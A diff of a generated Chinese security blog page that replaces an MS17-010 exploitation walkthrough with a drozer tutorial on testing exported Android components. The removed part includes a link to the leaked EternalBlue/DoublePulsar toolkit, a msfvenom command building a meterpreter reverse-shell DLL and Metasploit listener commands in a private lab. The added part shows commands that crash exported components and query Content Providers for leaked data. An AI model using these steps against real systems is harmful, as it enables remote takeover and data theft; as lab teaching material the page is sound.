@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          MS17_010py脚本利用 - Kat | Blog
+          使用drozer框架测试安卓组件 - Kat | Blog
         
     </title>
 
-    <link rel="canonical" href="https://spanning-tree.xyz/2020/11d3b845db.html">
+    <link rel="canonical" href="https://spanning-tree.xyz/2020/112273054a.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,14 +88,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#Redteam" title="Redteam">Redteam</a>
+                              <a class="tag" href="/tags/#移动安全" title="移动安全">移动安全</a>
                             
                         </div>
-                        <h1>MS17_010py脚本利用</h1>
+                        <h1>使用drozer框架测试安卓组件</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Kat on
-                            2020-11-19
+                            2020-11-23
                         </span>
                     </div>
                 
@@ -215,47 +215,47 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h3 id="ms17_010py脚本利用">MS17_010py脚本利用</h3>
-<p>为什么要介绍使用py脚本？</p>
-<p>因为有些机器存在漏洞，但是MSF模块利用失败，而使用py脚本可以成功利用。</p>
-<h4 id="安装环境">安装环境</h4>
-<blockquote>
-<p>运行python环境的系统必须为32位，需要下载安装扩展文件。</p>
-<p>Windows x86 python-2.6.6.msi：<br>
-<a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">https://www.python.org/download/releases/2.6.6/</a><br>
-pywin32-221.win32-py2.6.exe：<br>
-<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build 221/</a><br>
-方程式ETERNALBLUE 下载地址：<br>
-<a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master" target="_blank" rel="noopener">https://codeload.github.com/misterch0c/shadowbroker/zip/master</a></p>
-</blockquote>
-<h4 id="环境简介">环境简介</h4>
-<blockquote>
-<p>靶机：192.168.1.103（Win7-64）</p>
-<p>操作机：192.168.1.101 （MAC）</p>
-<p>操作机：192.168.1.104（Win7-32）</p>
-</blockquote>
-<h4 id="利用">利用</h4>
-<p>1、生成payload</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=1234 -f dll &gt;64.dll</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuwbm3sd6j30s905f76d.jpg" alt="image-20201119232432736"></p>
-<p>2、本地msf进行监听</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuweb222cj30mt076q5c.jpg" alt="image-20201119232708013"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lport 192.168.1.101</span><br><span class="line">set lport 1234</span><br></pre></td></tr></table></figure>
-<p>3、新建listeningposts文件夹并将msf生成的dll文件放入根目录，运行fb.py文件</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuv2prpxwj30k20qp77x.jpg" alt="image-20201119224124041"></p>
-<p>设置攻击相关信息</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw2bsuqij30i30esmze.jpg" alt="image-20201119231537200"></p>
-<p>Use Eternalblue 使用Eternalblue插件</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw4xvfdkj30pv0qkdiy.jpg" alt="image-20201119231807745"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw6jxu2wj30qo0c1wg3.jpg" alt="image-20201119231941181"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvl9ygttj30nv0ifq5v.jpg" alt="image-20201119225913910"></p>
-<p>接下来使用doublepulsar插件</p>
-<p>Use doublepulsar</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvpcxyb4j30oe0qtdiy.jpg" alt="image-20201119230309957"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvsaaynnj30lp0rhadk.jpg" alt="image-20201119230558825"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvu5s99kj30mr0kwtbd.jpg" alt="image-20201119230746276"></p>
-<p>这个时候返回msf，成功收到会话。</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuwitxzy4j30nq09x41b.jpg" alt="image-20201119233129340"></p>
+                <h2 id="使用drozer框架测试安卓组件">使用drozer框架测试安卓组件</h2>
+<h4 id="环境准备">环境准备</h4>
+<p>运行drozer框架，安卓端开启drozer</p>
+<p><img src="https://i.loli.net/2020/11/23/kWOxS7bzpnyDocw.png" alt="image-20201123203702949"></p>
+<p>使用adb检测是否能够连接到测试机器，成功连接后进行端口转发。</p>
+<p><img src="https://i.loli.net/2020/11/23/npaSQJ2HjMOdxhX.png" alt="image-20201123203912580"></p>
+<h4 id="测试安卓框架">测试安卓框架</h4>
+<p>查找app攻击面</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface 包名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/chSpKdX6lezqI2g.png" alt="image-20201123204128295"></p>
+<h4 id="导出组件activity拒绝服务漏洞">导出组件Activity拒绝服务漏洞</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info --package 包名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/1NHraPBICkKWz4i.png" alt="image-20201123204336649"></p>
+<p>对搜索到的Activity逐个执行以下命令，尝试启动Activity</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component 包名 组件名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/1NHraPBICkKWz4i.png" alt="image-20201123204730454"></p>
+<p>若目标应用崩溃，则该组件存在拒绝服务漏洞。</p>
+<h4 id="导出组件service拒绝服务漏洞">导出组件Service拒绝服务漏洞</h4>
+<p>执行以下命令，获取当前应用导出的Service:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info --package 包名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/1NHraPBICkKWz4i.png" alt="image-20201123204941084"></p>
+<p>对搜索到的Service逐个执行以下命令，尝试启动Service：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --component 包名 组件名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/MpQKeYXg4PTr9yB.png" alt="image-20201123205100872"></p>
+<h4 id="导出组件broadcast-receiver拒绝服务漏洞">导出组件Broadcast Receiver拒绝服务漏洞</h4>
+<p>执行以下命令，获取当前应用导出的Broadcast Receiver：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info --package 包名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/iCDUXIs5MYHA9Fw.png" alt="image-20201123205250632"></p>
+<p>对搜索到的Broadcast Receiver逐个执行以下命令，尝试启动Broadcast<br>
+Receiver：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --component 包名 组件名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/BI18XQ5nRtUiNlk.png" alt="image-20201123205450783"></p>
+<p>若目标应用崩溃，则该组件存在拒绝服务漏洞。</p>
+<h4 id="导出组件content-provider数据泄露">导出组件Content Provider数据泄露</h4>
+<p>执行以下命令，获取当前应用导出的Content Provider URI</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris --package 包名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/szU6cSJgiGIkLAo.png" alt="image-20201123205802255"></p>
+<p>对搜索到的URI逐个执行以下命令，尝试读取Content Provider中的数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query URI --vertical</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/11/23/BRQAyheaCx4YZLS.png" alt="image-20201123210151862"></p>
+<p>检查输出的数据是否包含敏感信息。</p>
 
                 
 
@@ -263,10 +263,10 @@ pywin32-221.win32-py2.6.exe：<br>
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2020/112273054a.html" data-toggle="tooltip" data-placement="top" title="使用drozer框架测试安卓组件">&larr; Previous Post</a>
-                        </li>
                     
+                        <li class="next">
+                            <a href="/2020/11d3b845db.html" data-toggle="tooltip" data-placement="top" title="MS17_010py脚本利用">Next Post &rarr;</a>
+                        </li>
                     
                 </ul>
 
@@ -321,7 +321,7 @@ pywin32-221.win32-py2.6.exe：<br>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ms17_010py脚本利用"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MS17_010py&#x811A;&#x672C;&#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#安装环境"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x5B89;&#x88C5;&#x73AF;&#x5883;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#环境简介"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x73AF;&#x5883;&#x7B80;&#x4ECB;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#利用"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">&#x5229;&#x7528;</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#使用drozer框架测试安卓组件"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">&#x4F7F;&#x7528;drozer&#x6846;&#x67B6;&#x6D4B;&#x8BD5;&#x5B89;&#x5353;&#x7EC4;&#x4EF6;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#环境准备"><span class="toc-nav-number">1.0.1.</span> <span class="toc-nav-text">&#x73AF;&#x5883;&#x51C6;&#x5907;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#测试安卓框架"><span class="toc-nav-number">1.0.2.</span> <span class="toc-nav-text">&#x6D4B;&#x8BD5;&#x5B89;&#x5353;&#x6846;&#x67B6;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#导出组件activity拒绝服务漏洞"><span class="toc-nav-number">1.0.3.</span> <span class="toc-nav-text">&#x5BFC;&#x51FA;&#x7EC4;&#x4EF6;Activity&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x6F0F;&#x6D1E;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#导出组件service拒绝服务漏洞"><span class="toc-nav-number">1.0.4.</span> <span class="toc-nav-text">&#x5BFC;&#x51FA;&#x7EC4;&#x4EF6;Service&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x6F0F;&#x6D1E;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#导出组件broadcast-receiver拒绝服务漏洞"><span class="toc-nav-number">1.0.5.</span> <span class="toc-nav-text">&#x5BFC;&#x51FA;&#x7EC4;&#x4EF6;Broadcast Receiver&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x6F0F;&#x6D1E;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#导出组件content-provider数据泄露"><span class="toc-nav-number">1.0.6.</span> <span class="toc-nav-text">&#x5BFC;&#x51FA;&#x7EC4;&#x4EF6;Content Provider&#x6570;&#x636E;&#x6CC4;&#x9732;</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -341,7 +341,7 @@ pywin32-221.win32-py2.6.exe：<br>
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#Redteam" title="Redteam">Redteam</a>
+                          <a class="tag" href="/tags/#移动安全" title="移动安全">移动安全</a>
                         
                     </div>
                 </section>
